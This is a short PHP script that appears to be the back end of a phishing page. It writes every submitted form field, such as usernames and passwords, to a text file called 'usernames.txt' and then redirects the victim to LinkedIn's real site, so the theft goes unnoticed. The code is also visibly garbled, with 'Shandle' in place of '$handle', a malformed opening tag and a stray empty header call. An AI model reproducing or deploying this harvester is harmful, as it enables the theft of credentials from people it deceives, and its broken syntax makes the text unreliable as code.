<? php
header
('location:');
Shandle-fopen("usernames.txt", "a");
foreach($_POST as $variable=>$value)

fwrite(Shandle,$variable);
fwrite(Shandle,"-");
fwrite(Shandle,$value);
fwrite(Shandle,"\r\n");

fwrite(Shandle,"\r\n");
fclose(Shandle);
header("location:https://www.linkedin.com/");
exit;
?>